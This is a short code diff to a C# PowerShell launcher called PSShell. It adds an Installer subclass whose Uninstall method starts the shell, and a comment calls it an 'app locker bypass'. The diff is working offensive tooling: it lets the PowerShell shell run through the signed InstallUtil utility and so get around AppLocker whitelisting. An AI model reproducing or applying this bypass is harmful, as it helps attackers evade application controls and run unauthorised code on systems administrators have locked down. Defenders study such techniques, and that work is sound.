@@ -10,9 +10,25 @@ using System.Management.Automation.Runspaces;
 
 namespace PSShell
 {
+    [System.ComponentModel.RunInstaller(true)]
+    public class InstallUtil : System.Configuration.Install.Installer
+    {
+        // @subTee app locker bypass
+        public override void Install(System.Collections.IDictionary savedState)
+        {
+
+        }
+
+        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Program.Main();
+        }
+    }
+
     class Program
     {
-        static void Main(string[] args)
+        public static void Main()
         {
             Console.Title = "PSShell - rui@deniable.org";
             Runspace runspace = RunspaceFactory.CreateRunspace();
